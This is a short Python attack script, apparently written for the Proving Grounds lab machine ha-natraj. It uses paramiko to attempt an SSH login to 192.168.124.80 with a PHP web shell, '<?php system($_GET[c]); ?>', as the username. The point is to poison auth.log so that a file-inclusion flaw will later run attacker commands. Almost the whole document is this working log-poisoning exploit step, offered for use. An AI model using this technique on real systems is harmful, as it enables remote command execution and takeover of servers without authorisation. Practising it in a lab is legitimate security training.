"""
See the Proving Grounds/ha-natraj notes. Use to poison auth.log with an ssh attempt 
when you cannot pass the php code over the cmd-line.
"""
import paramiko
 
host = "192.168.124.80"
username = "<?php system($_GET[c]); ?>"
password = ""
 
client = paramiko.client.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
_stdin, _stdout, _stderr = client.connect(host, username=username, password=password)
print(_stderr.read().decode())
